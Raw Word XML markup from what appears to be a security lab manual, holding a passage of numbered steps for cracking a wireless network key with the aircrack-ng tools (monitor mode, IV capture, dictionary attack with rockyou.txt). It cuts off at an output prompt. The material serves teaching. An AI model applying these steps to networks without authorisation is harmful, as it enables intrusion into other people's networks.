        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>on-ng.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">4.  If processes are </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ng </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hen k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>hose</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>proce</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>5.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="46"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Aga</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>art</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ess </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>erf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ce </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>or</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ode on spec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-12"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>AP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-9"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>channel</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>ng.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>6.  S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>art</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>rodu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">p-ng </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>cap</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>In</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>li</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>z</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-27"/>
        </w:rPr>
        <w:t>V</w:t>
      </w:r>
      <w:r>
        <w:t>ec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ors(IVs).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>7.  C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>I</w:t>
      </w:r>
      <w:r>
        <w:t>Vs for a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>east</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">5 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">10 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mi</w:t>
      </w:r>
      <w:r>
        <w:t>nu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hen press C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>rl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>+</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">C </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">op </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he oper</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">8.  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>Li</w:t>
      </w:r>
      <w:r>
        <w:t>st</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>e f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o see </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>cap</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ured</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>9.  Run a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>rcr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ck-ng </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o cr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>ck key us</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ng </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>e I</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>V</w:t>
      </w:r>
      <w:r>
        <w:t>s co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>onary</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>rockyou.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>xt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">10. If </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">he passphrase </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s found </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>onary</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hen</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>K</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ey Found </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>essage</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>sp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ayed;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>se pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Key Not</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="422" w:right="8488"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Found.</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b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId53">
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-6"/>
          </w:rPr>
          <w:t>r</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>oot@ka</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>li</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="2"/>
          </w:rPr>
          <w:t>:</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
            <w:spacing w:val="-1"/>
          </w:rPr>
          <w:t>~</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:b/>
          </w:rPr>
          <w:t>#</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
